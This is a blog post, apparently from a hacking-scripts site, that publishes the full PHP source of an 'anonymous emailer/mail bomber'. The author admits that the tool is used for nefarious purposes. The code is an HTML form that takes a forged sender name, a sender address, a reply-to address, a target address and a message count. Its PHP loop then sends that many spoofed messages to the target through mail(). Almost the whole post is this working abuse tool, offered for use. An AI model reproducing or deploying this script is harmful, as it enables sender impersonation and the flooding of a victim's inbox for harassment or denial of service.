---
id: 148
title: PHP Anonymous Emailer/Mail Bomber
author: admin
layout: post
guid: http://hackingscripts.com/?p=148
permalink: /php-anonymous-emailer/
categories:
  - PHP
tags:
  - Email bomber
  - PHP
---
Ok, so this isn&#8217;t really a hack script as such, but is also used for nefarious activities, and therefore is included here.

## PHP Anonymous Emailer/Mail Bomber Source Code

<pre class="brush: php; title: ; notranslate" title="">&lt;html&gt;
&lt;head&gt;
  &lt;title&gt;PHP Anonymous Emailer/Mail Bomber&lt;/title&gt;
&lt;body bgcolor="black" text="white"&gt;
&lt;form action="" method="post"&gt;
&lt;br&gt;&lt;font size="5" face="verdana"&gt;Sender&lt;/font&gt;&lt;br&gt;
&lt;br&gt;
   &lt;font size="2" face="verdana"&gt;&lt;b&gt;Name:&lt;/b&gt;&lt;/font&gt;&lt;br&gt;
    &lt;input name="from_name" type="text" value="" size="50"&gt;
    &lt;br&gt;&lt;br&gt;
    &lt;font size="2" face="verdana"&gt;&lt;b&gt;Email Adress:&lt;/b&gt;&lt;/font&gt;&lt;br&gt;
    &lt;input name="from_mail" type="text" value="" size="50"&gt;
&lt;br&gt;
&lt;br&gt;
    &lt;font size="2" face="verdana"&gt;&lt;b&gt;Reply Adress:&lt;/b&gt;&lt;/font&gt;&lt;br&gt;
    &lt;input name="email_return" type="text" value="" size="50"&gt;
&lt;br&gt;
&lt;br&gt;
&lt;br&gt;
&lt;br&gt;
  &lt;/div&gt;
  &lt;font size="5" face="verdana"&gt;Recipient Details&lt;/font&gt;&lt;br&gt;&lt;br&gt;
  &lt;font size="2" face="verdana"&gt;&lt;b&gt;Recipient Email:&lt;/b&gt;&gt;&lt;/font&gt;&lt;br&gt;
    &lt;input name="target" type="text" size="50"&gt;
&lt;br&gt;
&lt;br&gt;
    &lt;font size="2" face="verdana"&gt;&lt;b&gt;Subject:&lt;/b&gt;&lt;/font&gt;&lt;br&gt;
    &lt;input name="subject" type="text" value="" size="50"&gt;
&lt;br&gt;
&lt;br&gt;
    &lt;font size="2" face="verdana"&gt;&lt;b&gt;Message:&lt;/b&gt;&lt;/font&gt;&lt;br&gt;
    &lt;textarea name="message" cols="38" rows="5"&gt;&lt;/textarea&gt;
  &lt;br&gt;&lt;br&gt;&lt;font size="2" face="verdana"&gt;&lt;b&gt;Number Of Messages To Send&lt;/b&gt;&lt;/font&gt;&lt;p&gt;
    &lt;input name="messages" type="text" id="messages" value="" size="15"&gt;
&lt;br&gt;
&lt;br&gt;
    &lt;input type=submit&gt;
  &lt;/p&gt;
&lt;/form&gt;
   &lt;?php
       $header="From:$from_name&lt;$from_mail&gt;\n";
       $header .= "Reply-To:$email_return\n";
       $message2 = stripcslashes($message);
       for($x=1;$x&lt;$messages+1;$x++){
        mail($target,$subject,$message2,$header);
       }
   ?&gt;
</pre>